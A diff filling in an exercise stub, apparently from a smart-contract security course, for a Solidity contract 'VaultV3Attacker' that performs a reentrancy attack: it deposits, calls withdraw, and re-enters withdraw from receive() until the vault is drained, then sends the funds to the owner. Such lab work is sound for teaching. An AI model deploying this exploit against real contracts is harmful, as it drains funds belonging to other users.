@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT
+    // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
@@ -17,10 +17,18 @@ contract VaultV3Attacker is Ownable {
     }
 
     function attack() external payable onlyOwner {
-        // COMPLETAR
+        vault.deposit{value: msg.value}();
+
+        vault.withdraw();
     }
 
-    receive() external payable {
-        // COMPLETAR
+    function withdraw() external {
+        payable(owner()).transfer(address(this).balance);
     }
+    receive() external payable {
+        if(address(vault).balance > 0) {
+            vault.withdraw();
+        }
+    }
+
 }
